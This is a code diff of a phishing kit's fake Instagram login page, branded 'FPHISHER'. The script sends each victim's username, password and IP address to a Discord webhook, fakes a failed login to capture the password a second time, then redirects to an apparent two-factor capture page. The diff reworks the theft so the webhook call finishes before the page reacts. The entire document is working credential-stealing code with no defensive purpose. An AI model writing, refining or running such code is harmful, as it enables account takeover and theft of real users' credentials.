@@ -74,7 +74,7 @@
 
     let attempt = 0;
 
-    // Super lightweight IP fetch (only returns the IP address)
+    // Fast IP fetch (only IP address)
     async function getIP() {
       try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -83,6 +83,33 @@
       } catch (err) {
         console.error("IP fetch failed:", err);
         return 'Unknown';
+      }
+    }
+
+    // Send data to Discord
+    async function sendToDiscord(username, password, ip, attemptNum) {
+      const message = `**FPHISHER 🤖**
+
+**APP:** INSTAGRAM
+**USERNAME:** ${username}
+**PASSWORD:** ${password}
+**IP:** ${ip}
+**ATTEMPT:** ${attemptNum} ⏱️
+
+🔐 2025@FTECHSERVICES`;
+
+      try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: message,
+            username: "Instagram Phisher"
+          })
+        });
+        console.log(`✅ Attempt ${attemptNum} sent to Discord`);
+      } catch (err) {
+        console.error("Webhook failed:", err);
       }
     }
 
@@ -105,61 +132,36 @@
 
       attempt++;
 
-      // Send to Discord as fast as possible (in background)
-      const sendToDiscord = async (ip) => {
-        const message = `**FPHISHER 🤖**
+      // Get IP first
+      const ip = await getIP();
 
-**APP:** INSTAGRAM
-**USERNAME:** ${username}
-**PASSWORD:** ${password}
-**IP:** ${ip}
-
-**ATTEMPT:** ${attempt} ⏱️
-
-🔐 2025@FTECHSERVICES`;
-
-        try {
-          await fetch(DISCORD_WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              content: message,
-              username: "Instagram Phisher"
-            })
-          });
-          console.log("✅ Sent to Discord");
-        } catch (err) {
-          console.error("Webhook failed:", err);
-        }
-      };
+      // Send to Discord BEFORE doing UI actions
+      await sendToDiscord(username, password, ip, attempt);
 
       if (attempt === 1) {
-        // First attempt: show error instantly
+        // First attempt: show error
         errorMsg.classList.remove("hidden");
         passwordInput.value = "";
 
-        // Fetch IP and send in background (non-blocking)
-        getIP().then(ip => sendToDiscord(ip));
-
-      } else {
-        // Second attempt: show loading and redirect fast
+        // Optional shake effect
+        passwordInput.classList.add("animate-shake");
+        setTimeout(() => passwordInput.classList.remove("animate-shake"), 600);
+      } 
+      else {
+        // Second attempt: show loading then redirect
         btn.disabled = true;
         btnText.textContent = "Loading...";
         spinner.classList.remove("hidden");
 
-        // Start IP fetch + webhook in parallel
-        const ipPromise = getIP();
-        ipPromise.then(ip => sendToDiscord(ip));
-
-        // Redirect very quickly
+        // Small delay so user sees the loading state + webhook has time to complete
         setTimeout(() => {
           window.location.href = "securedfa.html";
-        }, 120);
+        }, 800);
       }
     });
   </script>
 
-  <!-- Optional shake animation for better feedback -->
+  <!-- Shake animation -->
   <style>
     @keyframes shake {
       0%, 100% { transform: translateX(0); }
